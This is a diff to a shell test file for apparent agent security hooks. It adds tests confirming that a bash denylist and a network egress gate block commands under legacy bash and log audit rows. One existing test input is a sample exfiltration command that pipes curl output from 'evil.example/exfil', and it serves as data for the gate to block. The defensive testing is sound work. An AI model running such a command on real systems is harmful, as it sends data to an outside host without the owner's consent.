@@ -140,6 +140,16 @@ SH
   jq -e '.decision_source == "bash-denylist" and .decision == "block"' "$(_chain_path)"
 }
 
+@test "bash-denylist legacy bash block appends audit row" {
+  run bash -c "BASH_VERSION=3.2; WALTER_BASH_DENYLIST_REEXEC=1; source '$REPO_ROOT/hooks/bash-denylist.sh'" \
+    <<< "$(_hook_event Bash "echo hi")"
+
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  [ "$(_rows)" = "1" ]
+  jq -e '.decision_source == "bash-denylist" and .decision == "block"' "$(_chain_path)"
+}
+
 @test "network-gate non-Bash passthrough appends exactly one audit row" {
   run _network_gate_tool Read
 
@@ -153,6 +163,16 @@ SH
   : > "$WALTER_CONFIG/egress-allowlist.txt"
 
   run _network_gate_bash 'echo $(curl https://evil.example/exfil)'
+
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  [ "$(_rows)" = "1" ]
+  jq -e '.decision_source == "network-gate" and .decision == "block"' "$(_chain_path)"
+}
+
+@test "network-gate legacy bash block appends audit row" {
+  run bash -c "BASH_VERSION=3.2; WALTER_NETWORK_GATE_REEXEC=1; source '$REPO_ROOT/hooks/network-gate.sh'" \
+    <<< "$(_hook_event Bash "curl https://example.com")"
 
   [ "$status" -eq 0 ]
   echo "$output" | jq -e '.decision == "block"'
